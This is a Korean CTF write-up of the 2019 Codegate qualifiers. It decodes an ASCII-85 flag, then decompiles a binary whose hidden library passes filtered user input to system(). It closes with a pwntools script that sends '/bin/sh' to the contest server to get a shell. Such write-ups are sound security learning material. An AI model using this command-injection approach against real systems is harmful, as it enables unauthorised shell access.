---
title: "2019 Codegate Quals Writeup"
date: 2019-1-31
tags: [Codegate]
categories: [CTF]
---

> 팀명 : 앙진헌띠

> 주니어부 23등

어쩌다 보니 본선에 가게되었다.. ㅎㅎ

###  MIC check

9P&;gFD,5.BOPCdBl7Q+@V'1dDK?qL 를 디코딩하라고 한다.

ASCII-85 디코딩 해주면 플래그가 나온다.

![](https://user-images.githubusercontent.com/32904385/51801712-cfde7180-2284-11e9-8a03-aca7a9ee978b.png)

**FLAG : Let the hacking begins ~**

<br />

### 20000

nc 와 20000이라는 바이너리와 20000개의 .so파일이 주어진다.

20000 바이너리의 메인함수이다. 메인에서 1~20000까지 입력받는데 이 입력 받은 수의 라이브러리 파일을 불러와서 test 함수를 실행시켜준다. 그리고 쉘을 따면 될 거 같다.

![](https://user-images.githubusercontent.com/32904385/51801713-d1a83500-2284-11e9-9466-0b858c34431d.png)

```c
signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v3; // rax
  signed __int64 result; // rax
  void *v5; // rdi
  char *v6; // rax
  int input; // [rsp+Ch] [rbp-94h]
  void (__fastcall *v8)(void *, const char *); // [rsp+10h] [rbp-90h]
  void *handle; // [rsp+18h] [rbp-88h]
  char s; // [rsp+20h] [rbp-80h]
  int v11; // [rsp+80h] [rbp-20h]
  int v12; // [rsp+84h] [rbp-1Ch]
  unsigned __int64 v13; // [rsp+88h] [rbp-18h]

  v13 = __readfsqword(0x28u);
  print_map();
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  memset(&s, 0, 0x60uLL);
  v11 = 0;
  printf("INPUT : ", 0LL, &v12);
  __isoc99_scanf("%d", &input);
  if ( input <= 0 && input > 20000 )
  {
    printf("Invalid Input", &input);
    exit(-1);
  }
  sprintf(&s, "./20000_so/lib_%d.so", input);
  handle = dlopen(&s, 1);
  if ( handle )
  {
    v5 = handle;
    v8 = dlsym(handle, "test");
    if ( v8 )
    {
      v8(v5, "test");
      dlclose(handle);
      result = 0LL;
    }
    else
    {
      v6 = dlerror();
      fprintf(stderr, "Error: %s\n", v6);
      dlclose(handle);
      result = 1LL;
    }
  }
  else
  {
    v3 = dlerror();
    fprintf(stderr, "Error: %s\n", v3);
    result = 1LL;
  }
  return result;
}
```



하지만 문제가 20000개의 lib 파일에서 무슨 파일인지 알 수 없었다. 왜 20000개인지 알 거 같았다. 마지막 수정 일 순으로 정렬해보면 `lib_17394.so` 파일만 수정일이 오전 10시 37분이였다. 다른 .so파일들은 수정일이 오후 10시 33분이였다. 

![](https://user-images.githubusercontent.com/32904385/51801715-d53bbc00-2284-11e9-99be-09c70874a936.png)



```c
signed __int64 test()
{
  char *v0; // rax
  signed __int64 result; // rax
  char *v2; // rax
  void (__fastcall *v3)(char *, char *); // [rsp+0h] [rbp-B0h]
  void (__fastcall *v4)(char *); // [rsp+8h] [rbp-A8h]
  void *handle; // [rsp+10h] [rbp-A0h]
  void *v6; // [rsp+18h] [rbp-98h]
  char buf; // [rsp+20h] [rbp-90h]
  __int16 v8; // [rsp+50h] [rbp-60h]
  char s; // [rsp+60h] [rbp-50h]
  __int16 v10; // [rsp+90h] [rbp-20h]
  unsigned __int64 v11; // [rsp+98h] [rbp-18h]

  v11 = __readfsqword(0x28u);
  memset(&buf, 0, 0x30uLL);
  v8 = 0;
  memset(&s, 0, 0x30uLL);
  v10 = 0;
  handle = dlopen("./20000_so/lib_4323.so", 1);
  if ( handle )
  {
    v3 = dlsym(handle, "filter1");
    v6 = dlopen("./20000_so/lib_11804.so", 1);
    if ( v6 )
    {
      v4 = dlsym(v6, "filter2");
      puts("This is lib_17394 file.");
      puts("How do you find vulnerable file?");
      read(0, &buf, 0x32uLL);
      v3(&buf, &buf);
      v4(&buf);
      sprintf(&s, "%s 2 > /dev/null", &buf);
      system(&s);
      dlclose(handle);
      dlclose(v6);
      result = 0LL;
    }
    else
    {
      v2 = dlerror();
      fprintf(stderr, "Error: %s\n", v2);
      result = 0xFFFFFFFFLL;
    }
  }
  else
  {
    v0 = dlerror();
    fprintf(stderr, "Error: %s\n", v0);
    result = 0xFFFFFFFFLL;
  }
  return result;
}
```

`lib_17394.so` 를 보면 `lib_4323.so` 라이브러리의 fillter1을 실행시키고 `lib_11804.so` 라이브러리의 fillter2를 실행시켜준다. 그러면 이제 fillter만 우회해서 쉘을 따주면 될 거 같다. system(&s) 를 실행시켜주니까 저기에 쉘을 넣어주면 될 거 같다.

![](https://user-images.githubusercontent.com/32904385/51801716-d66ce900-2284-11e9-848d-62289a7de43f.png)

Exploit Code

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import *

# testlib = CDLL('./c1e3a33d8932a4a61b0e0e0e49d6c9bc/20000_so/lib_17394.so')
"""
Filltering
; * | & $ ` > < v m p d f g l
r bash
"""
#p = process('././c1e3a33d8932a4a61b0e0e0e49d6c9bc/20000')
p = remote('110.10.147.106',15959)
print p.sendlineafter('INPUT :','17394')
print p.sendlineafter('How do you find vulnerable file?','/bin/sh')
p.interactive()
```



![](https://user-images.githubusercontent.com/32904385/51801718-d79e1600-2284-11e9-8e04-7fdd0e9f8c27.png)

**FLAG : Are_y0u_A_h@cker_in_real-word?**

